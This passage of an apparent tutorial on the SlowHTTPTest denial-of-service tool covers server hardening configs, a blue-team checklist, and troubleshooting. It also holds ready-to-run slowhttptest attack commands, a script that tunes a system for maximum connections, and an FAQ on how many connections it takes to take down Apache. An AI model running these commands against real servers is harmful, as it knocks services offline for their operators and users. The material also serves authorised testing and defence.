# /etc/nginx/nginx.conf
http {
    client_body_timeout 10s;
    client_header_timeout 10s;
    keepalive_timeout 15s;
    send_timeout 10s;
    limit_conn_zone $binary_remote_addr zone=addr:10m;
    limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
    
    server {
        listen 80;
        limit_conn addr 10;
        limit_req zone=one burst=20 nodelay;
    }
}
```

#### HAProxy: Front-Line Protection

```
# /etc/haproxy/haproxy.cfg
global
    maxconn 100000

defaults
    timeout http-request 10s
    timeout http-keep-alive 10s
    timeout connect 5s
    timeout client 30s
    timeout server 30s

frontend http-in
    bind *:80
    # Rate limit per source IP
    stick-table type ip size 200k expire 30s store http_req_rate(10s)
    http-request track-sc0 src
    http-request deny deny_status 429 if { sc_http_req_rate(0) gt 100 }
    
    # Connection limit per source IP
    stick-table type ip size 200k expire 30s store conn_cur
    http-request track-sc1 src
    http-request deny if { sc_conn_cur(1) gt 50 }
    
    default_backend servers

backend servers
    balance roundrobin
    server web1 127.0.0.1:8080 check
```

#### iptables Connection Rate Limiting

```bash
# Limit new connections per IP per minute
iptables -A INPUT -p tcp --dport 80 --syn \
    -m hashlimit --hashlimit-above 30/min --hashlimit-burst 60 \
    --hashlimit-mode srcip --hashlimit-name http_limit \
    -j DROP

# Limit total concurrent connections per IP
iptables -A INPUT -p tcp --dport 80 \
    -m connlimit --connlimit-above 30 --connlimit-mask 32 \
    -j REJECT --reject-with tcp-reset

# Limit SYN_RECV connections (indicates SYN flood or slowloris)
iptables -A INPUT -p tcp --dport 80 \
    -m connlimit --connlimit-above 100 --connlimit-mask 32 \
    --connlimit-syn \
    -j DROP
```

#### fail2ban Integration

```ini
# /etc/fail2ban/filter.d/slowloris.conf
[Definition]
failregex = ^<HOST> -.*"(GET|POST|HEAD).*
ignoreregex =
datepattern = %%d/%%b/%%Y:%%H:%%M:%%S
```

```ini
# /etc/fail2ban/jail.d/slowloris.conf
[slowloris]
enabled  = true
port     = http,https
filter   = slowloris
logpath  = /var/log/apache2/access.log
maxretry = 300
findtime = 60
bantime  = 3600
```

### Blue Team Detection Checklist

1. Monitor connection counts per source IP on web server ports
2. Track Apache BusyWorkers vs IdleWorkers ratio
3. Set up alerts for connections in SYN_RECV or ESTABLISHED state exceeding thresholds
4. Deploy mod_reqtimeout or equivalent on all web servers
5. Place a reverse proxy (HAProxy, Nginx) in front of application servers
6. Configure rate limiting at network edge (iptables, cloud WAF)
7. Use fail2ban to automatically block IPs with abnormally many connections
8. Monitor for low-bandwidth, high-connection-count patterns in NetFlow data
9. Enable HTTP/2 or HTTP/3 (QUIC) which handle connections differently
10. Consider CDN-level DDoS protection (Cloudflare, AWS Shield, etc.)

---

## Chapter 8: Troubleshooting

### Common Errors and Solutions

#### Error: "Can't connect to target"

```
can't connect to target.com:80: Connection refused
```

**Causes and fixes:**
```bash
# 1. Verify the target is reachable
curl -I http://target.com/

# 2. Check if the port is correct
nmap -p 80,443,8080,8443 target.com

# 3. Ensure the URL includes the protocol
slowhttptest -u http://target.com/   # Correct
slowhttptest -u target.com           # Wrong — missing protocol
```

#### Error: "Too many open files"

```
socket: Too many open files
```

**Fix:**
```bash
# Check current limit
ulimit -n

# Increase temporarily
ulimit -n 65535

# Make permanent — add to /etc/security/limits.conf
* soft nofile 65535
* hard nofile 65535
```

#### Error: "Cannot assign requested address"

**Cause:** Ephemeral port exhaustion.
```bash
# Check port range
cat /proc/sys/net/ipv4/ip_local_port_range

# Expand it
sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"

# Enable port reuse
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
```

#### Error: "Address already in use"

**Fix:**
```bash
# Check for lingering connections
ss -ant '( sport = :80 )' | grep TIME_WAIT | wc -l

# Reduce TIME_WAIT
sudo sysctl -w net.ipv4.tcp_fin_timeout=15
sudo sysctl -w net.ipv4.tcp_tw_reuse=1

# Wait for ports to free up, or reduce connection count
```

#### Tool Produces 0 Open Connections

**Possible causes:**
- Server is blocking your IP after detecting the pattern
- Server has mod_reqtimeout or equivalent installed
- Connection rate (`-r`) is too high, causing connection failures
- Target URL is incorrect

```bash
# Debug: increase verbosity
slowhttptest -H -u http://target.com/ -c 100 -v 4 -l 30

# Try lower connection count and rate
slowhttptest -H -u http://target.com/ -c 50 -r 20 -v 4 -l 30
```

#### Generated HTML/CSV Files Are Empty

**Cause:** Forgot to include `-g` flag.
```bash
# Must use -g with -o
slowhttptest -H -u http://target.com/ -c 1000 -g -o my_stats -v 1
```

### Performance Tips

#### Maximizing Connection Count on Linux

```bash
#!/bin/bash
# optimize_for_slowhttptest.sh

# Increase file descriptors
ulimit -n 65535

# Tune TCP stack
sudo sysctl -w net.core.somaxconn=65535
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65535
sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
sudo sysctl -w net.ipv4.tcp_fin_timeout=10
sudo sysctl -w net.core.netdev_max_backlog=65535

echo "[+] System optimized for high connection counts"
echo "    Max open files: $(ulimit -n)"
echo "    Port range: $(cat /proc/sys/net/ipv4/ip_local_port_range)"
```

#### Reducing Local Resource Usage

```bash
# Use fewer connections with longer duration
slowhttptest -H -u http://target.com/ \
    -c 200 -r 20 -i 30 -l 600 -x 24 -p 3 \
    -g -o low_resource_test

# Slow Read is the most efficient mode (minimal bandwidth)
slowhttptest -X -u http://target.com/ \
    -c 500 -r 50 -n 30 -z 1 -w 64 -y 128 -k 1 -l 600 -p 3
```

### FAQ

**Q: Is SlowHTTPTest the same as Slowloris?**
A: SlowHTTPTest includes a Slowloris mode (`-H`) but also implements three other attack variants (Slow Body, Range Header, Slow Read). Slowloris is one of four attack modes.

**Q: Does SlowHTTPTest work against Nginx?**
A: Yes, but Nginx is more resilient than Apache because it handles connections differently. Slow Read (`-X`) is often more effective against Nginx than Slowloris.

**Q: How many connections do I need to DoS Apache?**
A: Depends on Apache's MaxRequestWorkers (default 150-256). You need roughly that many concurrent slow connections to exhaust workers. Start with 500 and adjust.

**Q: Can I test HTTPS targets?**
A: Yes, just use an `https://` URL. SlowHTTPTest handles SSL/TLS natively.

**Q: What is the minimum bandwidth needed?**
A: As low as 1 Kbps per connection. With 1000 connections at 1 Kbps, you need only ~1 Mbps total to hold open 1000 Apache worker threads.

**Q: How does this differ from goldeneye?**
A: Goldeneye is Python-based and primarily implements Slowloris. SlowHTTPTest is C++-based, faster, supports four attack modes, and generates detailed HTML/CSV reports.

---

## Resources

### Official Documentation
- [SlowHTTPTest GitHub Repository](https://github.com/shekyan/slowhttptest)
- [SlowHTTPTest Man Page](https://github.com/shekyan/slowhttptest/blob/master/doc/slowhttptest.1.ronn)
- [Kali Linux Package Page](https://www.kali.org/tools/slowhttptest/)

### Research and Background
- [RSnake's Original Slowloris Paper](https://web.archive.org/web/20160328055933/http://ha.ckers.org/slowloris/)
- [OWASP Slow HTTP DoS](https://owasp.org/www-community/attacks/Slow_HTTP_DoS)
- [CERT Advisory on HTTP DoS](https://www.kb.cert.org/vuls/id/348121)
- [Apache Killer (Range Header Attack)](https://seclists.org/fulldisclosure/2011/Aug/175)

### Related Tools
- [GoldenEye](https://github.com/jseidl/goldeneye) — Python-based Slowloris tool
- [HULK](https://github.com/grafov/hulk) — HTTP Unbearable Load King
- [HOIC](https://en.wikipedia/wiki/High_Orbit_Ion_Cannon) — High Orbit Ion Cannon
- [siege](https://www.joedog.org/siege-home/) — HTTP load testing

### Practice Labs
- [DVWA](https://github.com/digininja/DVWA) — Damn Vulnerable Web Application
- [HackTheBox](https://www.hackthebox.com/) — Penetration testing labs
- [TryHackMe](https://tryhackme.com/) — Guided cybersecurity labs
- [VulnHub](https://www.vulnhub.com/) — Vulnerable VMs
